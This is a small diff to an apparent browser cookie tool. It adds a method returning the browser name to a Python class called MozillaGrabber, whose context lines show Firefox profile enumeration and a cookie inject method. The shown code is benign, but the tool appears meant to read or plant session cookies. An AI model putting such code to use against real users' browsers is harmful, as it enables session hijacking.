@@ -56,6 +56,9 @@ class MozillaGrabber():
     if "Crash Reports" in p: p.remove("Crash Reports")
     return p
 
+  def getBrowserName(self):
+    return "Mozilla Firefox"
+
   def inject(self, cookies, user, profile):
     path=self.cookieTrail%(user,profile)
     if type(cookies)!=list:
